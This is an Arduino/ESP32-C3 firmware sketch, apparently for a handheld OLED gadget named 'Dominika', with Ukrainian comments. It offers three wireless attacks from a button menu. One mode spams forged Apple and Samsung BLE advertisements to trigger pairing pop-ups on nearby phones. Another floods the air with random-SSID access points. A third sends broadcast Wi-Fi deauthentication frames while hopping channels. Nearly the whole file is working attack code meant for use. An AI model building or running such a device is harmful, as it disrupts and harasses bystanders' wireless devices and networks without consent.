/*
  Dominika — ESP32-C3 SuperMini + 1.30" I2C OLED
  BLE Spammer + WiFi Random + WiFi Deauth Flood
  BOOT: short=move, hold=ok/stop
  OLED: SDA=5, SCL=6
*/
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SH110X.h>
#include <WiFi.h>

#include "esp_bt.h"
#include "esp_gap_ble_api.h"
#include "esp_bt_main.h"
#include "esp_bt_device.h"
#include "nvs_flash.h"

extern "C" {
  #include "esp_wifi.h"
  #include "esp_wifi_types.h"
  #include "esp_event.h"
  #include "esp_log.h"
}

#define W 128
#define H 64
#define SDA_PIN 5
#define SCL_PIN 6
#define BOOT 9
#define DEB 35
#define HOLD 600

Adafruit_SH1106G oled(W, H, &Wire, -1);

enum { S_SNOW, S_MENU, S_BLE, S_WIFI, S_DEAUTH, S_BRUN, S_WRUN, S_DRUN };
uint8_t st = S_SNOW, mi = 0, si = 0;
bool bleOn = 0, wifiOn = 0, deauthOn = 0;
uint32_t t0 = 0;
bool held = 0, shortP = 0, longP = 0;

const char* WORD = "Dominika";
struct L { int8_t x, y, sp, tx; bool ok; };
L let[8];

// ==================== BLE ПАКЕТИ ====================
uint8_t airpods[] = {
  0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

uint8_t airpods_pro[] = {
  0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

uint8_t airpods_max[] = {
  0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

uint8_t airpods_2[] = {
  0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

uint8_t beats[] = {
  0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

uint8_t apple_setup[] = {
  0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00
};

uint8_t samsung[] = {
  0x27, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09, 0x1e, 0x1f, 0x10, 0x11, 0x1b, 0x1c, 0x1d, 0x1a, 0x16, 0x17, 0x18, 0x19, 0x12, 0x13, 0x0e, 0x0f, 0x0c, 0x0d, 0x0a, 0x0b, 0x07, 0x08, 0x09, 0x04, 0x05, 0x02
};

struct PacketEntry {
  uint8_t* data;
  size_t size;
};

PacketEntry all_packets[] = {
  { airpods, sizeof(airpods) }, { airpods_pro, sizeof(airpods_pro) }, { airpods_max, sizeof(airpods_max) }, { airpods_2, sizeof(airpods_2) }, { beats, sizeof(beats) }, { apple_setup, sizeof(apple_setup) }, { samsung, sizeof(samsung) }
};
const int PACKET_COUNT = 7;

static esp_ble_adv_params_t adv_params = {
  .adv_int_min = 0x20, .adv_int_max = 0x30, .adv_type = ADV_TYPE_IND, .own_addr_type = BLE_ADDR_TYPE_RANDOM, .channel_map = ADV_CHNL_ALL, .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY, };

bool ble_initialized = false;
uint32_t last_ble_tick = 0;
const uint32_t BLE_INTERVAL = 80;

// ========== DEAUTH ЗМІННІ ==========
typedef struct {
  uint8_t header[24];
} wifi_ieee80211_mac_hdr_t;

typedef struct {
  wifi_ieee80211_mac_hdr_t hdr;
  uint8_t payload[2];
} wifi_ieee80211_deauth_t;

wifi_ieee80211_deauth_t deauth_packet;
uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
uint32_t last_deauth_tick = 0;
const uint32_t DEAUTH_INTERVAL = 20;
uint8_t deauth_channel = 1;

// ========== ФУНКЦІЇ BLE ==========
void ble_init() {
  if (ble_initialized) return;

  esp_err_t ret = nvs_flash_init();
  if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    ESP_ERROR_CHECK(nvs_flash_erase());
    ret = nvs_flash_init();
  }
  ESP_ERROR_CHECK(ret);

  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
  ret = esp_bt_controller_init(&bt_cfg);if (ret != ESP_OK) return;

  ret = esp_bt_controller_enable(ESP_BT_MODE_BLE);
  if (ret != ESP_OK) return;

  ret = esp_bluedroid_init();
  if (ret != ESP_OK) return;

  ret = esp_bluedroid_enable();
  if (ret != ESP_OK) return;

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);

  esp_ble_gap_register_callback([](esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {});

  ble_initialized = true;
}

void ble_deinit() {
  if (!ble_initialized) return;
  esp_ble_gap_stop_advertising();
  esp_bluedroid_disable();
  esp_bluedroid_deinit();
  esp_bt_controller_disable();
  esp_bt_controller_deinit();
  ble_initialized = false;
  bleOn = false;
}

void ble_start() {
  if (bleOn) return;
  ble_init();
  bleOn = true;
  last_ble_tick = millis();
}

void ble_stop() {
  if (!bleOn) return;
  ble_deinit();
  bleOn = false;
}

void ble_tick() {
  if (!bleOn || !ble_initialized) return;

  uint32_t now = millis();
  if (now - last_ble_tick < BLE_INTERVAL) return;
  last_ble_tick = now;

  esp_ble_gap_stop_advertising();
  delay(5);

  int idx = esp_random() % PACKET_COUNT;
  uint8_t* packet_data = all_packets[idx].data;
  size_t packet_size = all_packets[idx].size;

  uint8_t addr[6];
  for (int i = 0; i < 6; i++) {
    addr[i] = (uint8_t)(esp_random() & 0xFF);
  }
  addr[0] = (addr[0] & 0x3F) | 0xC0;

  esp_ble_gap_set_rand_addr(addr);
  esp_ble_gap_config_adv_data_raw(packet_data, packet_size);
  esp_ble_gap_start_advertising(&adv_params);
}

// ========== ФУНКЦІЇ DEAUTH ==========
void deauth_init() {
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);

  memset(&deauth_packet, 0, sizeof(deauth_packet));

  deauth_packet.hdr.header[0] = 0xC0;
  deauth_packet.hdr.header[1] = 0x00;
  deauth_packet.hdr.header[2] = 0x00;
  deauth_packet.hdr.header[3] = 0x00;

  memcpy(&deauth_packet.hdr.header[4], broadcast_mac, 6);

  uint8_t random_mac[6];
  for (int i = 0; i < 6; i++) {
    random_mac[i] = esp_random() & 0xFF;
  }
  random_mac[0] = (random_mac[0] & 0xFC) | 0x02;
  memcpy(&deauth_packet.hdr.header[10], random_mac, 6);

  uint8_t target_mac[6];
  for (int i = 0; i < 6; i++) {
    target_mac[i] = esp_random() & 0xFF;
  }
  target_mac[0] = (target_mac[0] & 0xFC) | 0x02;
  memcpy(&deauth_packet.hdr.header[16], target_mac, 6);

  deauth_packet.hdr.header[22] = 0x00;
  deauth_packet.hdr.header[23] = 0x00;

  deauth_packet.payload[0] = 0x01;
  deauth_packet.payload[1] = 0x00;

  deauthOn = true;
}

void deauth_stop() {
  if (!deauthOn) return;
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_deinit();
  deauthOn = false;
}

void deauth_tick() {
  if (!deauthOn) return;

  uint32_t now = millis();
  if (now - last_deauth_tick < DEAUTH_INTERVAL) return;
  last_deauth_tick = now;

  static int packet_count = 0;
  packet_count++;
  if (packet_count % 100 == 0) {
    deauth_channel = (deauth_channel % 13) + 1;
    esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
  }

  uint8_t random_mac[6];
  for (int i = 0; i < 6; i++) {
    random_mac[i] = esp_random() & 0xFF;
  }
  random_mac[0] = (random_mac[0] & 0xFC) | 0x02;
  memcpy(&deauth_packet.hdr.header[10], random_mac, 6);

  uint8_t target_mac[6];
  for (int i = 0; i < 6; i++) {
    target_mac[i] = esp_random() & 0xFF;
  }
  target_mac[0] = (target_mac[0] & 0xFC) | 0x02;
  memcpy(&deauth_packet.hdr.header[16], target_mac, 6);

  esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&deauth_packet, sizeof(deauth_packet), false);
}

void deauth_toggle() {
  if (deauthOn) {
    deauth_stop();
  } else {
    deauth_init();
  }
}

// ========== ФУНКЦІЇ WIFI RANDOM ==========
void wifiStart() {
  if (wifiOn) return;
  WiFi.mode(WIFI_AP);
  wifiOn = 1;
}

void wifiStop() {
  if (!wifiOn) return;
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  wifiOn = 0;
}

void wifiTick() {
  if (!wifiOn) return;
  static uint32_t last;
  if (millis() - last < 300) return;
  last = millis();
  char ssid[10];
  const char* c = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789";
  for (int i = 0; i < 8; i++) ssid[i] = c[esp_random() % 58];
  ssid[8] = 0;
  WiFi.softAP(ssid, nullptr, 1 + (esp_random() % 11), 0, 1);
}

// ========== КНОПКА ==========
void btn() {
  shortP = longP = 0;
  bool p = !digitalRead(BOOT);
  if (p && !held) { t0 = millis(); held = 1; }
  if (!p && held) {
    uint32_t d = millis() - t0;
    if (d > DEB && d < HOLD) shortP = 1;
    if (d >= HOLD) longP = 1;
    held = 0;
  }
}

// ========== АНІМАЦІЯ SNOW ==========
void snowInit() {
  int sx = (W - 96) / 2;
  for (int i = 0; i < 8; i++) {
    let[i].x = sx + i * 12 + (esp_random() % 17) - 8;
    let[i].y = -8 - (esp_random() % 36);
    let[i].sp = 1 + (esp_random() % 2);
    let[i].tx = sx + i * 12;
    let[i].ok = 0;
  }
}

bool snowRun() {
  bool done = 1;
  oled.clearDisplay();
  oled.setTextSize(2);
  oled.setTextColor(SH110X_WHITE);
  for (int i = 0; i < 8; i++) {
    L& Lr = let[i];
    if (!Lr.ok) {
      Lr.y += Lr.sp;
      if (Lr.y >= 28) { Lr.y = 28; Lr.x = Lr.tx; Lr.ok = 1; }
      else done = 0;
    }
    oled.setCursor(Lr.x, Lr.y);
    oled.print(WORD[i]);
  }
  oled.display();
  return done;
}

// ========== ІНТЕРФЕЙС ==========
void drawMenu() {
  oled.clearDisplay();
  oled.setTextSize(1);
  oled.setTextColor(SH110X_WHITE);
  oled.setCursor(34, 0); oled.print("MENU");

  auto row = [](int y, bool sel, const char* t) {
    if (sel) {
      oled.fillRect(0, y-2, W, 12, SH110X_WHITE);
      oled.setTextColor(SH110X_BLACK);
    } else {
      oled.setTextColor(SH110X_WHITE);
    }
    oled.setCursor(8, y);
    oled.print(sel ? "> " : "  ");
    oled.print(t);
  };

  row(14, mi==0, "BLE Apple+Sam");
  row(28, mi==1, "WiFi Random");
  row(42, mi==2, "WiFi Deauth");

  oled.setTextColor(SH110X_WHITE);
  oled.setCursor(0, 56);
  oled.print("tap:move hold:ok");
  oled.display();
}

void drawSub(const char* title, bool run) {
  oled.clearDisplay();
  oled.setTextSize(1);
  oled.setTextColor(SH110X_WHITE);
  oled.setCursor(16, 0); oled.print(title);
  oled.setCursor(8, 16); oled.print(run ? "RUNNING" : "STOPPED");

  auto row = [](int y, bool sel, const char* t) {
    if (sel) {
      oled.fillRect(0, y-2, W, 12, SH110X_WHITE);
      oled.setTextColor(SH110X_BLACK);
    } else {
      oled.setTextColor(SH110X_WHITE);
    }
    oled.setCursor(16, y);
    oled.print(sel ? "> " : "  ");
    oled.print(t);
  };

  row(32, si==0, "START");
  row(46, si==1, "STOP/BACK");
  oled.display();
}

void drawRun(const char* t) {
  oled.clearDisplay();
  oled.setTextSize(1);
  oled.setTextColor(SH110X_WHITE);
  oled.setCursor(20, 12); oled.print(t);
  oled.setCursor(28, 32); oled.print("SPAMMING");
  oled.setCursor(4, 52); oled.print("hold BOOT = stop");
  oled.display();
}

// ========== SETUP & LOOP ==========
void setup() {
  pinMode(BOOT, INPUT_PULLUP);
  Wire.begin(SDA_PIN, SCL_PIN);
  oled.begin(0x3C, true);
  oled.clearDisplay();
  oled.display();
  snowInit();
  esp_random();
}

void loop() {
  btn();

  switch (st) {
    case S_SNOW: {
      static uint32_t f;
      if (millis() - f > 28) {
        f = millis();
        if (snowRun()) {
          delay(900);
          st = S_MENU;
          mi = 0;
          drawMenu();
        }
      }
      break;
    }

    case S_MENU:
      if (shortP) {
        mi = (mi + 1) % 3;
        drawMenu();
      }
      if (longP) {
        si = 0;
        if (mi == 0) {
          st = S_BLE;
          drawSub("BLE A+S", bleOn);
        } else if (mi == 1) {
          st = S_WIFI;
          drawSub("WiFi Rnd", wifiOn);
        } else {
          st = S_DEAUTH;
          drawSub("WiFi Deauth", deauthOn);
        }
      }
      break;

    case S_BLE:
      if (shortP) { si ^= 1; drawSub("BLE A+S", bleOn); }
      if (longP) {
        if (!si) {
          ble_start();
          st = S_BRUN;drawRun("BLE A+S");
        } else {
          ble_stop();
          st = S_MENU;
          drawMenu();
        }
      }
      break;

    case S_BRUN:
      ble_tick();
      if (longP) {
        ble_stop();
        st = S_BLE;
        si = 1;
        drawSub("BLE A+S", 0);
      }
      break;

    case S_WIFI:
      if (shortP) { si ^= 1; drawSub("WiFi Rnd", wifiOn); }
      if (longP) {
        if (!si) {
          wifiStart();
          st = S_WRUN;
          drawRun("WiFi Rnd");
        } else {
          wifiStop();
          st = S_MENU;
          drawMenu();
        }
      }
      break;

    case S_WRUN:
      wifiTick();
      if (longP) {
        wifiStop();
        st = S_WIFI;
        si = 1;
        drawSub("WiFi Rnd", 0);
      }
      break;

    case S_DEAUTH:
      if (shortP) { si ^= 1; drawSub("WiFi Deauth", deauthOn); }
      if (longP) {
        if (!si) {
          deauth_init();
          st = S_DRUN;
          drawRun("WiFi Deauth");
        } else {
          deauth_stop();
          st = S_MENU;
          drawMenu();
        }
      }
      break;

    case S_DRUN:
      deauth_tick();
      if (longP) {
        deauth_stop();
        st = S_DEAUTH;
        si = 1;
        drawSub("WiFi Deauth", 0);
      }
      break;
  }
}
